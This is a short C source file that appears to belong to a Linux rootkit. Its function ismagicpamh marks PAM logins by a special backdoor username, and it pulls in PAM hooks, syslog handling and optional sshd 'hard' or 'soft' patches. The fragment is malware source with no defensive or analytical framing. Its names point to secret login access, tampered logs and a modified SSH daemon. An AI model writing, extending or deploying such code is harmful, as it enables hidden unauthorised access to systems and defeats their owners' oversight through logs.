#include "clean.c"

#include "pam_private.h"

int __attribute((visibility("hidden"))) ismagicpamh(const pam_handle_t *pamh){
    return isbduname(get_username(pamh));
}

#include "pam_hooks.c"
#include "pam_syslog.c"

#ifdef HARD_PATCH
#include "sshdpatch/hard.c"
#elif defined SOFT_PATCH
#include "sshdpatch/soft.c"
#endif